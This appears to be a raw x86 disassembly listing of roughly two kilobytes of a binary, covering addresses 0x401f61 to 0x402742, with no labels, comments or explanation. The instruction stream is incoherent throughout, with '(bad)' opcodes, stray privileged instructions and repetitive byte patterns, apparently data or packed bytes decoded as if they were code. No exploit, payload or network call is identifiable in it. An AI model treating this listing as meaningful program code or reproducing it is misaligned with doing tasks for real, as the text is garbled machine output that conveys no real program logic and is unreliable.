  401f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f62:	mov    BYTE PTR [ecx+edx*1],ah
  401f65:	mov    cl,BYTE PTR [edx]
  401f67:	add    al,0x0
  401f69:	add    DWORD PTR [eax-0x78],ecx
  401f6c:	add    BYTE PTR [eax],dl
  401f6e:	add    al,0x7
  401f70:	test   eax,0x2620890
  401f75:	or     BYTE PTR [edx-0x3bdef4c0],al
  401f7b:	ja     0x401fc3
  401f7d:	add    BYTE PTR [eax],al
  401f7f:	pusha  
  401f80:	add    eax,DWORD PTR [esi]
  401f82:	add    al,BYTE PTR [eax+0x40]
  401f85:	adc    DWORD PTR [eax+0x2011109],edx
  401f8b:	test   BYTE PTR [esi+0x0],cl
  401f8e:	adc    eax,0x10056002
  401f94:	push   esi
  401f95:	or     al,BYTE PTR [ecx]
  401f97:	mov    eax,DWORD PTR [eax]
  401f99:	add    al,0x0
  401f9b:	xor    edx,DWORD PTR [eax]
  401f9d:	sub    al,BYTE PTR [ecx+0x40c00405]
  401fa3:	rol    DWORD PTR [ecx+0x10],0xff
  401fa7:	adc    eax,0x417508
  401fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fad:	mov    ebp,0xc2c89021
  401fb2:	or     al,0x26
  401fb4:	xor    BYTE PTR [edx],0x14
  401fb7:	pop    ebp
  401fb8:	or     DWORD PTR [ecx],esp
  401fba:	mov    WORD PTR [eax-0x7baff99f],fs
  401fc0:	dec    eax
  401fc1:	daa    
  401fc2:	and    BYTE PTR [eax+0x400003e1],0x22
  401fc9:	adc    BYTE PTR [eax+0xb002096],bh
  401fcf:	ins    DWORD PTR es:[edi],dx
  401fd0:	dec    esi
  401fd1:	adc    DWORD PTR [ebx],ecx
  401fd3:	or     BYTE PTR ds:0x19a4c512,ah
  401fd9:	push   es
  401fda:	add    al,0x3b
  401fdd:	or     al,0x2a
  401fdf:	add    BYTE PTR [ebx],al
  401fe1:	ror    DWORD PTR [esi+0x40410390],0x44
  401fe8:	retf   
  401fe9:	inc    ecx
  401fea:	and    DWORD PTR [eax+0x121b040f],ecx
  401ff0:	or     BYTE PTR [eax+eiz*4],al
  401ff3:	or     cl,BYTE PTR [edx]
  401ff5:	add    BYTE PTR [eax+0x3000020],cl
  401ffb:	and    BYTE PTR [eax],cl
  401ffd:	or     ch,BYTE PTR [ecx+eiz*4]
  402000:	sub    BYTE PTR [edx],al
  402002:	or     al,0x82
  402004:	cmp    eax,DWORD PTR [edx+0x9001010]
  40200a:	mov    al,BYTE PTR [eax+0x100c5032]
  402010:	pop    esp
  402011:	dec    eax
  402012:	inc    edx
  402013:	pusha  
  402014:	add    BYTE PTR [eax],ah
  402016:	add    al,0x41
  402018:	add    al,0x0
  40201a:	add    DWORD PTR [eax],edi
  40201c:	add    BYTE PTR [edx],al
  40201e:	xor    eax,0xe4081009
  402023:	push   cs
  402024:	sbb    BYTE PTR [eax+0x40],ch
  402027:	adc    BYTE PTR [ebx+0x8],dh
  40202a:	or     BYTE PTR [eax],cl
  40202c:	cmp    BYTE PTR [eax+0x11048283],al
  402032:	jbe    0x40203c
  402034:	and    BYTE PTR [ebp+0x13],bl
  402037:	add    DWORD PTR [esi],esi
  402039:	or     al,0x10
  40203b:	adc    cl,BYTE PTR [ebx]
  40203d:	and    BYTE PTR [edx],al
  40203f:	inc    eax
  402040:	add    al,0x10
  402042:	and    BYTE PTR [ecx+0x2],al
  402045:	add    DWORD PTR [eax],eax
  402047:	mov    al,ds:0x1908020
  40204c:	sub    BYTE PTR [ebx+ecx*1+0x20cac18],dh
  402053:	or     BYTE PTR [eax],ah
  402055:	add    BYTE PTR [eax],ah
  402057:	sbb    DWORD PTR [ecx],0x81056390
  40205d:	add    BYTE PTR [ebp-0x5f577000],al
  402063:	and    BYTE PTR [ebx],al
  402065:	adc    al,BYTE PTR [edx]
  402067:	inc    ebx
  402068:	inc    esp
  402069:	es jo  0x40206e
  40206c:	or     al,0x3
  40206e:	inc    eax
  40206f:	and    eax,0x8180a005
  402074:	xchg   ebx,eax
  402075:	add    BYTE PTR [ebp+0x74],al
  402078:	or     DWORD PTR [eax+ebx*1],eax
  40207b:	and    cl,BYTE PTR [eax+0x1]
  40207e:	add    DWORD PTR [eax],ebx
  402080:	or     DWORD PTR [eax],ecx
  402082:	mov    ds:0x9120402,al
  402087:	add    BYTE PTR [eax],al
  402089:	test   BYTE PTR [edx+0x61402149],al
  40208f:	adc    ah,BYTE PTR [ebx+0x45800200]
  402095:	and    BYTE PTR [eax-0x15fcf2b6],dl
  40209b:	dec    ebp
  40209c:	adc    BYTE PTR [eax-0x5dfdc000],al
  4020a2:	add    DWORD PTR [ecx],edx
  4020a4:	add    BYTE PTR [eax],dh
  4020a6:	add    al,al
  4020a8:	add    ecx,ecx
  4020aa:	adc    DWORD PTR [ebx+edx*4],eax
  4020ad:	inc    edx
  4020ae:	or     BYTE PTR [ecx],al
  4020b0:	adc    DWORD PTR [eax],0x51
  4020b3:	or     eax,0xe13a6b40
  4020b8:	add    BYTE PTR [ecx-0x68],al
  4020bb:	xchg   ecx,eax
  4020bc:	add    BYTE PTR [eax-0x2af767f0],dl
  4020c2:	add    BYTE PTR [ecx],al
  4020c4:	rcl    BYTE PTR [eax+0x21600009],0x10
  4020cb:	xor    al,0x8a
  4020cd:	add    BYTE PTR [eax-0x80],0x14
  4020d1:	inc    ebp
  4020d2:	inc    esp
  4020d3:	daa    
  4020d4:	jp     0x4020fb
  4020d6:	or     BYTE PTR [eax+0x30014300],cl
  4020dc:	inc    eax
  4020dd:	add    BYTE PTR [eax],al
  4020df:	sub    ah,BYTE PTR [eax]
  4020e1:	add    dl,BYTE PTR [eax]
  4020e3:	add    al,0xc
  4020e5:	sbb    BYTE PTR [eax+0x20688008],0x24
  4020ec:	or     al,0x80
  4020ee:	and    DWORD PTR [eax],ebp
  4020f0:	and    BYTE PTR [edx+0x4042018],ch
  4020f6:	repz out 0x20,eax
  4020f9:	and    DWORD PTR [eax+eax*1],0x90008060
  402100:	inc    eax
  402101:	add    BYTE PTR [eax],dl
  402103:	and    esp,DWORD PTR [eax]
  402105:	data16 or BYTE PTR [ebx+ebx*1+0x2f],al
  40210a:	adc    DWORD PTR [edx+eiz*1],edx
  40210d:	xchg   edx,eax
  40210e:	add    al,BYTE PTR [ebx]
  402110:	add    BYTE PTR [ecx],ah
  402112:	pusha  
  402113:	add    DWORD PTR [esi],0x18024100
  402119:	sub    BYTE PTR [eax+eax*1+0x53],dl
  40211d:	inc    edx
  40211e:	and    BYTE PTR [edx-0x7bb5fef4],ah
  402124:	add    BYTE PTR [eax+0x2c],ah
  402127:	adc    BYTE PTR [eax+0x19982930],al
  40212d:	sbb    DWORD PTR [edx+edi*4],eax
  402130:	rol    BYTE PTR [ecx],1
  402132:	or     BYTE PTR [eax],al
  402134:	test   BYTE PTR [eax+0x18202018],bh
  40213a:	add    BYTE PTR [eax+0x61],al
  40213d:	mov    al,ds:0xc808011
  402142:	aam    0x1
  402144:	enter  0x404e,0x32
  402148:	mov    BYTE PTR [ecx],ah
  40214a:	(bad)  
  40214b:	rcl    BYTE PTR [eax+0x224106c4],0x8
  402152:	pop    eax
  402153:	add    BYTE PTR [eax],dh
  402155:	add    DWORD PTR [edx],esp
  402157:	push   eax
  402158:	add    al,0x8
  40215a:	or     DWORD PTR [eax],eax
  40215c:	adc    al,0x28
  40215e:	dec    esp
  40215f:	sub    ah,BYTE PTR [edi]
  402161:	stos   BYTE PTR es:[edi],al
  402162:	adc    ebp,DWORD PTR [edx]
  402164:	and    al,BYTE PTR [eax-0x80]
  402167:	add    al,0x50
  402169:	or     esp,esp
  40216b:	fadd   QWORD PTR [ecx+0x61431000]
  402171:	enter  0xac28,0x36
  402175:	add    al,0x2
  402177:	or     BYTE PTR es:[ecx+eax*1],al
  40217b:	add    al,0x21
  40217d:	cmp    BYTE PTR [esi+eax*8-0x7df75f9e],al
  402184:	sbb    BYTE PTR [ecx+0x19803101],ah
  40218a:	rol    DWORD PTR [edx],1
  40218c:	or     eax,DWORD PTR [ecx-0x7d97f77c]
  402192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402193:	cwde   
  402194:	add    BYTE PTR [eax+eax*1],cl
  402197:	inc    ebp
  402198:	add    BYTE PTR gs:[eax+eax*1-0x7ce3caee],0x80
  4021a1:	test   DWORD PTR [eax+0x14b0208],ecx
  4021a7:	add    bl,BYTE PTR [eax-0x5b9eed7c]
  4021ad:	add    BYTE PTR [eax+0x22],ah
  4021b0:	add    BYTE PTR [eax+0x19],al
  4021b3:	dec    ecx
  4021b4:	add    al,0x34
  4021b6:	inc    eax
  4021b7:	mov    BYTE PTR [edx],cl
  4021b9:	add    BYTE PTR [eax+0x1],ah
  4021bc:	inc    edx
  4021bd:	dec    eax
  4021be:	or     BYTE PTR [eax],0x51
  4021c1:	inc    ebx
  4021c2:	add    BYTE PTR [edx+eax*1+0x100c82],bh
  4021c9:	mov    al,ds:0x9a250800
  4021ce:	push   cs
  4021cf:	adc    DWORD PTR [ecx],eax
  4021d1:	adc    BYTE PTR [eax],al
  4021d3:	adc    al,BYTE PTR [ebx]
  4021d5:	imul   esp,DWORD PTR ds:0xe6083103,0x23
  4021dc:	mov    BYTE PTR [eax],al
  4021de:	adc    DWORD PTR [esi+eiz*1+0x140c3604],ecx
  4021e5:	push   ecx
  4021e6:	adc    al,0x0
  4021e8:	inc    edx
  4021e9:	and    cl,BYTE PTR [edx]
  4021eb:	add    al,BYTE PTR fs:[eax+0x40]
  4021ef:	mov    al,ds:0x5a03e0
  4021f4:	adc    eax,0x80000102
  4021f9:	into   
  4021fa:	adc    BYTE PTR [eax+0x25],cl
  4021fd:	inc    esi
  4021fe:	jo     0x402240
  402200:	add    DWORD PTR [ecx+ecx*2],eax
  402203:	adc    DWORD PTR [edx+ebx*1],ecx
  402206:	and    BYTE PTR [eax],0xa0
  402209:	add    BYTE PTR [ecx+eiz*1-0x80],0x0
  40220e:	push   eax
  40220f:	mov    eax,DWORD PTR [ecx]
  402211:	add    BYTE PTR [edi],dl
  402213:	mov    ds:0x39706014,al
  402218:	and    DWORD PTR [edx+0x52110a80],ebp
  40221e:	sbb    dl,BYTE PTR [eax+0x310810e0]
  402224:	inc    edx
  402225:	inc    eax
  402226:	cmp    BYTE PTR [esp+ecx*4],0x3
  40222a:	add    BYTE PTR [ecx],dh
  40222c:	loopne 0x40226e
  40222e:	inc    eax
  40222f:	adc    BYTE PTR [eax],al
  402231:	and    BYTE PTR [eax],0x43
  402234:	pop    es
  402235:	adc    BYTE PTR [eax],dh
  402237:	or     dh,BYTE PTR [eax]
  402239:	jp     0x4021bd
  40223b:	xchg   esp,eax
  40223c:	sub    BYTE PTR [eax+0xb00038],al
  402242:	adc    al,0x81
  402244:	inc    eax
  402245:	inc    esp
  402246:	add    al,0x80
  402248:	and    BYTE PTR [edx],al
  40224a:	or     al,al
  40224c:	push   eax
  40224d:	mov    al,BYTE PTR [eax+0x5b]
  402250:	xchg   esp,eax
  402251:	rcl    DWORD PTR [edx+eiz*2],cl
  402254:	nop
  402255:	adc    BYTE PTR [eax],cl
  402257:	mov    al,ds:0x8848100a
  40225c:	sub    al,0x6a
  40225e:	rol    BYTE PTR [eax],0x20
  402261:	add    BYTE PTR [ecx],cl
  402263:	pop    es
  402264:	inc    eax
  402265:	adc    al,0x20
  402267:	and    eax,0x48490b48
  40226c:	add    BYTE PTR [ecx],ah
  40226e:	add    DWORD PTR [ebx+0x108012],ecx
  402274:	int3   
  402275:	inc    ecx
  402276:	add    BYTE PTR [eax],0x8
  402279:	inc    edx
  40227a:	sub    al,0x40
  40227c:	or     al,BYTE PTR es:[eax]
  40227f:	dec    eax
  402280:	add    BYTE PTR [eax],al
  402282:	pop    eax
  402283:	add    BYTE PTR [ecx+0x0],cl
  402286:	add    eax,eax
  402288:	cmp    esp,DWORD PTR [eax+0x0]
  40228b:	xchg   esp,eax
  40228c:	and    dl,al
  40228e:	les    eax,FWORD PTR [edx]
  402290:	or     BYTE PTR [eax],al
  402292:	add    DWORD PTR [ecx],esp
  402294:	or     al,BYTE PTR [eax+0x209811]
  40229a:	and    BYTE PTR [edx+0x2046248c],bl
  4022a0:	add    BYTE PTR [esi],cl
  4022a2:	add    BYTE PTR [edx+0x4a80040],dl
  4022a8:	add    eax,DWORD PTR [ebx]
  4022aa:	sub    DWORD PTR [eax],0x0
  4022ad:	add    cl,BYTE PTR [ecx]
  4022af:	cwde   
  4022b0:	inc    esi
  4022b1:	adc    BYTE PTR [edx+0x10],al
  4022b4:	mov    WORD PTR ds:0x109c0883,ds
  4022ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022bb:	add    BYTE PTR ds:0x26241680,al
  4022c1:	mov    eax,ds:0x11022a00
  4022c6:	test   al,0x4b
  4022c8:	add    al,BYTE PTR ds:0x40001002
  4022ce:	pusha  
  4022cf:	and    BYTE PTR [eax],cl
  4022d1:	and    al,0x2
  4022d4:	pusha  
  4022d5:	fcom   DWORD PTR ds:0x87240a32
  4022db:	inc    ecx
  4022dc:	dec    eax
  4022dd:	or     al,0x12
  4022df:	(bad)  
  4022e0:	and    BYTE PTR [eax],dl
  4022e2:	dec    eax
  4022e3:	sub    DWORD PTR [ecx+0x4],esp
  4022e6:	or     BYTE PTR [eax+edx*1+0x51201904],al
  4022ed:	sub    al,0x8b
  4022ef:	add    al,0x92
  4022f1:	add    BYTE PTR [eax],ah
  4022f3:	fs mov cl,0x1
  4022f6:	add    BYTE PTR [eax+eax*2],al
  4022f9:	or     eax,0x7a100869
  4022fe:	xor    eax,0x11080801
  402303:	add    al,0x2
  402305:	and    BYTE PTR [edx+eax*1],0xb
  402309:	adc    DWORD PTR [eax+ebp*1],esi
  40230c:	inc    eax
  40230d:	ret    0x8e28
  402310:	dec    esi
  402311:	fadd   DWORD PTR [ecx]
  402313:	adc    dl,BYTE PTR [eax+0x103028ca]
  402319:	dec    eax
  40231a:	or     DWORD PTR ds:0xe54d9181,eax
  402320:	sbb    al,BYTE PTR [edx]
  402322:	sub    al,0x0
  402324:	mov    ds:0x406810a,eax
  402329:	and    BYTE PTR [eax],0x80
  40232c:	nop
  40232d:	inc    esi
  40232e:	inc    ecx
  40232f:	push   0xffffffd1
  402331:	inc    ecx
  402332:	inc    ebp
  402333:	add    al,0x4
  402335:	xchg   ecx,eax
  402336:	push   eax
  402337:	and    al,BYTE PTR [eax]
  402339:	add    al,0x12
  40233b:	add    DWORD PTR [ebx],ecx
  40233d:	and    al,0x4
  40233f:	ret    
  402340:	add    BYTE PTR [ebx],ah
  402342:	add    al,0x80
  402344:	push   edi
  402345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402346:	and    DWORD PTR [eax-0x1c],ebx
  402349:	add    BYTE PTR [esp+edx*1],cl
  40234c:	mov    DWORD PTR [ebx],eax
  40234e:	add    ebp,DWORD PTR [edx+edx*2]
  402351:	pusha  
  402352:	inc    edx
  402353:	dec    esp
  402354:	mov    BYTE PTR [edi+0x49200904],al
  40235a:	and    DWORD PTR [ecx-0x77],ebx
  40235d:	xchg   BYTE PTR ds:0xa0601a0a,cl
  402363:	and    al,BYTE PTR [eax-0x7ffefed8]
  402369:	sbb    DWORD PTR [eax],eax
  40236b:	add    DWORD PTR [eax+0x24],eax
  40236e:	xor    DWORD PTR [ecx],ebx
  402370:	mov    dh,BYTE PTR [eax]
  402372:	add    al,BYTE PTR [eax+0x447c008]
  402378:	jno    0x40239a
  40237a:	dec    esp
  40237b:	inc    edx
  40237c:	xchg   BYTE PTR [edx+ecx*1],al
  40237f:	adc    BYTE PTR [edx+edx*2+0x44],0x40
  402384:	and    eax,0x80800148
  402389:	cli    
  40238a:	or     BYTE PTR [edx],0x10
  40238d:	inc    eax
  40238e:	sub    BYTE PTR [edx],dh
  402390:	or     BYTE PTR [edx+0x9001015],al
  402396:	or     BYTE PTR [ecx],cl
  402398:	mov    BYTE PTR [eax+edx*4],al
  40239b:	mov    BYTE PTR [ecx+eax*2+0x485c3026],al
  4023a2:	sub    BYTE PTR [ecx+0x6000dc0c],dh
  4023a8:	add    eax,DWORD PTR [esi+0x29]
  4023ab:	mov    al,ds:0x41420514
  4023b0:	add    DWORD PTR [edx+0x9420c1],eax
  4023b6:	inc    eax
  4023b7:	add    BYTE PTR [eax],al
  4023b9:	pusha  
  4023ba:	and    BYTE PTR [ecx],al
  4023bc:	push   eax
  4023bd:	and    al,0x80
  4023bf:	shl    BYTE PTR [ebp+0x0],cl
  4023c2:	adc    eax,0x55f0f942
  4023c7:	add    BYTE PTR [ecx],dh
  4023c9:	inc    eax
  4023ca:	adc    BYTE PTR [ebp+0x23],0x24
  4023ce:	and    BYTE PTR ds:0x29490c18,al
  4023d4:	adc    DWORD PTR [eax],0x3101290
  4023da:	sbb    BYTE PTR [edx],cl
  4023dc:	loope  0x4023de
  4023de:	mov    al,ds:0x402e6c8
  4023e3:	inc    eax
  4023e4:	push   eax
  4023e5:	mov    al,ds:0x48120210
  4023ea:	sub    BYTE PTR [eax+0x18a30306],al
  4023f0:	inc    ebx
  4023f1:	enter  0x1320,0x28
  4023f5:	adc    cl,BYTE PTR [edx+0x8]
  4023f8:	add    BYTE PTR [eax],al
  4023fa:	sub    al,BYTE PTR [eax-0x1d]
  4023fd:	or     BYTE PTR [edx],al
  4023ff:	or     BYTE PTR [edx-0x4a],al
  402402:	or     dl,BYTE PTR gs:[eax+0x48410c0]
  402409:	cmp    al,0xa0
  40240b:	add    ch,ah
  40240d:	adc    eax,0x41120028
  402412:	or     dl,BYTE PTR [eax]
  402414:	leave  
  402415:	xor    DWORD PTR [ecx-0x7ce9accc],edx
  40241b:	imul   eax,DWORD PTR [edx],0x44302082
  402421:	add    esp,DWORD PTR [eax+0x72bce104]
  402427:	push   es
  402428:	rol    BYTE PTR [ecx],0x5
  40242b:	inc    edi
  40242c:	add    ebp,DWORD PTR [eax]
  40242e:	jne    0x4023c0
  402430:	add    ebx,DWORD PTR [edx+0x4]
  402433:	adc    BYTE PTR [eax+eiz*4],0xca
  402437:	mov    BYTE PTR [ebp+0xb40450],dl
  40243d:	add    cl,al
  40243f:	add    al,al
  402441:	cmp    BYTE PTR [eax+eax*4+0x1f090420],al
  402448:	and    ebp,edx
  40244a:	jo     0x402419
  40244c:	inc    esp
  40244d:	inc    edi
  40244e:	mov    al,ds:0xc205e14a
  402453:	and    BYTE PTR [ecx],ch
  402455:	ror    BYTE PTR [eax],0x15
  402458:	add    BYTE PTR [edx],dh
  40245a:	sub    BYTE PTR [eax-0x4f],0x92
  40245e:	xchg   ecx,eax
  40245f:	adc    BYTE PTR [eax+ecx*1-0x6d87ff80],al
  402466:	add    eax,0xf4307201
  40246b:	add    BYTE PTR [ecx+0x40],dh
  40246e:	add    edx,DWORD PTR [eax+0x12]
  402471:	add    BYTE PTR [eax+0x4002],0xc0
  402478:	push   ecx
  402479:	and    BYTE PTR [eax],0x18
  40247c:	add    BYTE PTR [ebx-0x4eddbc00],dl
  402482:	add    BYTE PTR [eax],al
  402484:	inc    eax
  402485:	pop    ecx
  402486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402487:	add    dl,al
  402489:	dec    eax
  40248a:	or     DWORD PTR [ebx+0x56],ecx
  40248d:	adc    BYTE PTR [eax],cl
  40248f:	dec    eax
  402490:	mov    ds:0x462aebde,al
  402495:	fadd   DWORD PTR [eax+0x62]
  402498:	add    BYTE PTR [eax+0x10],al
  40249b:	cmp    eax,0x950402
  4024a0:	and    al,0x1
  4024a2:	add    al,0xf
  4024a4:	add    ah,BYTE PTR [eax]
  4024a6:	je     0x4024a8
  4024a8:	test   al,0xa0
  4024aa:	sbb    BYTE PTR [eax-0x5dffafe4],ah
  4024b0:	push   cs
  4024b1:	add    ch,BYTE PTR [eax]
  4024b3:	sbb    BYTE PTR [eax+ebx*1],0x58
  4024b7:	xor    DWORD PTR [ebp-0x20],edx
  4024ba:	int3   
  4024bb:	xor    al,0x40
  4024bd:	add    BYTE PTR [eax+eax*1+0x2040106c],al
  4024c4:	add    BYTE PTR [eax],dl
  4024c6:	or     BYTE PTR [eax],dl
  4024c8:	and    esi,DWORD PTR [ecx]
  4024ca:	push   es
  4024cb:	test   ebp,edx
  4024cd:	or     BYTE PTR [ecx+0x50],al
  4024d0:	push   esi
  4024d1:	aam    0x3d
  4024d3:	inc    ebx
  4024d4:	sbb    al,BYTE PTR [edx]
  4024d6:	jo     0x402538
  4024d8:	add    al,0x0
  4024da:	or     BYTE PTR [eax],al
  4024dc:	and    cl,ah
  4024de:	mov    al,0x9
  4024e0:	add    BYTE PTR [ebp+0x40045110],bl
  4024e6:	add    BYTE PTR ds:0x91202c0c,bh
  4024ec:	test   BYTE PTR [eax+0x54],dl
  4024ef:	ror    BYTE PTR [edx+0x40],0x1
  4024f3:	adc    ch,0x2
  4024f6:	pop    eax
  4024f7:	mov    ah,0x4
  4024f9:	cmp    al,0x56
  4024fb:	or     BYTE PTR [esi],al
  4024fd:	add    DWORD PTR [edx+ecx*1],eax
  402500:	mov    eax,ds:0x9070029a
  402505:	mov    ds:0x24127629,eax
  40250a:	add    BYTE PTR [eax],ch
  40250c:	xchg   ebp,eax
  40250d:	add    BYTE PTR [eax+0x29533c03],dl
  402513:	adc    al,0x85
  402515:	or     BYTE PTR gs:[eax-0x3a],dl
  402519:	rol    BYTE PTR [edx-0x70],0xa9
  40251d:	mov    al,ds:0x141821e2
  402522:	pop    eax
  402523:	jb     0x402525
  402525:	add    DWORD PTR ds:0x4508400,eax
  40252b:	ret    0x1228
  40252e:	(bad)  
  40252f:	adc    DWORD PTR [eax],eax
  402531:	add    BYTE PTR [eax+0x6],al
  402534:	add    BYTE PTR [ecx],dh
  402536:	inc    esp
  402537:	add    BYTE PTR [edi+eax*8],al
  40253a:	lods   al,BYTE PTR ds:[esi]
  40253b:	or     BYTE PTR [ecx],0x41
  40253e:	add    BYTE PTR [ecx],ch
  402540:	add    BYTE PTR [esi+0x16140104],ah
  402546:	add    BYTE PTR [edx],al
  402548:	retf   
  402549:	pusha  
  40254a:	sahf   
  40254b:	add    al,0x3c
  40254d:	or     BYTE PTR [edx],al
  40254f:	add    BYTE PTR [ebp+0x1007900],cl
  402555:	add    BYTE PTR [eax+0x0],dl
  402558:	or     BYTE PTR [edx],al
  40255a:	loopne 0x40255c
  40255c:	adc    al,0x25
  40255e:	add    esp,DWORD PTR [eax+0x4a]
  402561:	adc    eax,0x30060011
  402566:	add    BYTE PTR [eax+edx*1],cl
  402569:	sub    DWORD PTR [edx],edi
  40256b:	rol    BYTE PTR [edx+esi*4],0x0
  40256f:	push   cs
  402570:	xor    BYTE PTR es:[eax+0x5],0x13
  402575:	push   eax
  402576:	and    ebx,DWORD PTR [edx+0x41110]
  40257c:	or     DWORD PTR [eax+0x68],ecx
  40257f:	add    eax,0x50522014
  402584:	add    DWORD PTR [eax],ecx
  402586:	or     al,0x5c
  402588:	add    BYTE PTR [eax-0x6c],dl
  40258b:	retf   0x24c9
  40258e:	and    BYTE PTR [edx],al
  402590:	add    dl,al
  402592:	pop    ecx
  402593:	and    DWORD PTR [eax],eax
  402595:	add    ah,BYTE PTR [edi]
  402597:	mov    esp,0x8140198
  40259c:	push   ebp
  40259d:	mov    BYTE PTR [esi+eax*8],al
  4025a0:	retf   
  4025a1:	or     BYTE PTR [eax],al
  4025a3:	add    BYTE PTR [eax+eiz*4+0x28],0x80
  4025a8:	ror    BYTE PTR [ecx],0x40
  4025ab:	and    al,0x40
  4025ad:	or     BYTE PTR [edx],al
  4025af:	add    BYTE PTR [esi],0xa0
  4025b2:	add    DWORD PTR [eax],esi
  4025b4:	add    BYTE PTR [ecx+0x20],dl
  4025b7:	mov    cl,0x86
  4025b9:	or     al,0x0
  4025bb:	or     BYTE PTR [edx],dh
  4025bd:	add    DWORD PTR [eax-0x80],ecx
  4025c0:	xor    al,BYTE PTR [eax]
  4025c2:	inc    esp
  4025c3:	inc    eax
  4025c4:	jo     0x4025d7
  4025c6:	sub    BYTE PTR [eax],cl
  4025c8:	or     esi,DWORD PTR [ecx]
  4025ca:	test   BYTE PTR [edx],al
  4025cc:	xor    BYTE PTR [eax],dl
  4025ce:	shl    BYTE PTR [edx+0x14],0x68
  4025d2:	inc    eax
  4025d3:	add    DWORD PTR [eax],edx
  4025d5:	mov    al,BYTE PTR [ecx]
  4025d7:	xchg   edx,eax
  4025d8:	sbb    BYTE PTR [edx],ah
  4025da:	pusha  
  4025db:	cli    
  4025dc:	adc    BYTE PTR [eax],0x2
  4025df:	and    al,0x11
  4025e1:	push   eax
  4025e2:	add    al,0x18
  4025e4:	add    al,0x68
  4025e6:	dec    eax
  4025e7:	add    DWORD PTR [ecx],0x920a0010
  4025ed:	and    BYTE PTR [eax],al
  4025ef:	xor    BYTE PTR [eax+0x2c],al
  4025f2:	add    DWORD PTR [eax+eax*4+0x48],eax
  4025f6:	test   BYTE PTR [eax],cl
  4025f8:	or     BYTE PTR [eax],dl
  4025fa:	sbb    al,BYTE PTR [eax]
  4025fc:	add    BYTE PTR [esi-0x4537df10],ah
  402602:	add    al,0x14
  402604:	cmp    BYTE PTR [edx+0x40],0x4
  402608:	xor    al,0x0
  40260b:	add    ebx,DWORD PTR [eax+0x10]
  40260e:	adc    bl,BYTE PTR [ecx]
  402610:	mov    al,ds:0x14600028
  402615:	add    BYTE PTR [eax],al
  402617:	add    al,BYTE PTR [eax]
  402619:	adc    ecx,DWORD PTR [eax+0x26]
  40261c:	daa    
  40261d:	add    ah,BYTE PTR [eax+ecx*1+0x73]
  402621:	out    0x9,al
  402623:	push   ecx
  402624:	inc    ecx
  402625:	mov    ds:0xa0600,eax
  40262a:	inc    edx
  40262b:	cwde   
  40262c:	add    BYTE PTR [edx+0x16068040],dl
  402632:	add    BYTE PTR ds:0x71004008,al
  402638:	adc    BYTE PTR [eax],0x6
  40263b:	and    BYTE PTR [edx+0x41],bh
  40263e:	add    bl,al
  402640:	mov    edx,cr0
  402643:	add    al,BYTE PTR [edx-0x3f4ecfcf]
  402649:	dec    eax
  40264a:	add    BYTE PTR [eax+ecx*1],dl
  40264d:	push   eax
  40264e:	add    BYTE PTR ds:0xa1948003,al
  402654:	push   eax
  402655:	add    BYTE PTR [ecx+eax*8+0x824500],ah
  40265c:	add    BYTE PTR [eax],cl
  40265e:	or     eax,0x4001084
  402663:	sbb    al,0x81
  402665:	and    DWORD PTR [eax+0x4c202054],eax
  40266b:	add    edx,DWORD PTR ds:0x2130f020
  402671:	inc    eax
  402672:	add    BYTE PTR [edx+0x9b428c0],cl
  402678:	push   0xffffffe4
  40267a:	add    eax,DWORD PTR [eax-0x40]
  40267d:	dec    eax
  40267e:	add    BYTE PTR ds:[eax+0x0],bh
  402682:	add    al,BYTE PTR [eax-0x65ddfc50]
  402688:	add    al,0x8
  40268a:	inc    ebp
  40268b:	and    BYTE PTR [eax+0x40],cl
  40268e:	retf   0xa02
  402691:	inc    esi
  402692:	or     dl,BYTE PTR [eax]
  402694:	mov    al,ds:0x8230eb90
  402699:	xchg   DWORD PTR [esi],ebx
  40269b:	mov    ds:0xb008002,al
  4026a0:	add    al,BYTE PTR [ebx-0x36]
  4026a3:	add    al,BYTE PTR [edx]
  4026a5:	pop    ss
  4026a6:	or     BYTE PTR [edx+0x16d0080],al
  4026ac:	lds    esp,FWORD PTR [ecx]
  4026ae:	xchg   esp,eax
  4026af:	nop
  4026b0:	add    BYTE PTR [eax+ecx*2+0x9c02918],al
  4026b7:	dec    edx
  4026b8:	enter  0x1144,0x8
  4026bc:	inc    eax
  4026bd:	rol    BYTE PTR [eax],0x2a
  4026c0:	dec    eax
  4026c1:	adc    DWORD PTR [ebx],edx
  4026c3:	inc    eax
  4026c4:	sbb    al,0x0
  4026c6:	add    eax,0x8408918d
  4026cb:	and    DWORD PTR [edi+0x0],edx
  4026ce:	inc    eax
  4026cf:	add    al,0xa1
  4026d1:	inc    eax
  4026d2:	mov    es,WORD PTR [eax]
  4026d4:	add    al,0x80
  4026d6:	add    edx,DWORD PTR [ecx]
  4026d8:	adc    BYTE PTR [ecx+0x10],dl
  4026db:	nop
  4026dc:	add    al,0x90
  4026de:	add    al,BYTE PTR [eax+ebp*4]
  4026e1:	inc    eax
  4026e2:	inc    edx
  4026e3:	adc    BYTE PTR [eax+0x0],al
  4026e6:	sbb    al,0x8
  4026e8:	or     edx,DWORD PTR [esi]
  4026ea:	adc    eax,0x62104c00
  4026ef:	es inc edx
  4026f1:	add    BYTE PTR [eax],al
  4026f3:	lea    esp,[esi+0x202808a0]
  4026f9:	enter  0x2029,0x0
  4026fd:	or     DWORD PTR [eax],ecx
  4026ff:	or     al,BYTE PTR [ecx]
  402701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402702:	inc    ebp
  402703:	adc    BYTE PTR [edx],cl
  402705:	adc    al,BYTE PTR [ecx+0x11]
  402708:	or     BYTE PTR [edx+0x203440c5],0x1
  40270f:	sbb    al,0x40
  402711:	push   eax
  402712:	add    BYTE PTR [edx+0x111d0c46],dl
  402718:	add    BYTE PTR [ebx+0x42980088],al
  40271e:	inc    ebx
  40271f:	adc    BYTE PTR [eax+0x40],cl
  402722:	cmp    al,BYTE PTR [eax+0x4440442]
  402728:	adc    dl,BYTE PTR [ecx+0x31]
  40272b:	inc    eax
  40272c:	inc    ecx
  40272d:	and    cl,BYTE PTR [ecx+0x801186d]
  402733:	xor    BYTE PTR [edx],al
  402735:	and    al,0x42
  402737:	mov    al,ds:0x4a01aa48
  40273c:	and    BYTE PTR [esp+eax*1],0x2
  402740:	xor    BYTE PTR [ecx],al
  402742:	add    BYTE PTR [eax],ah
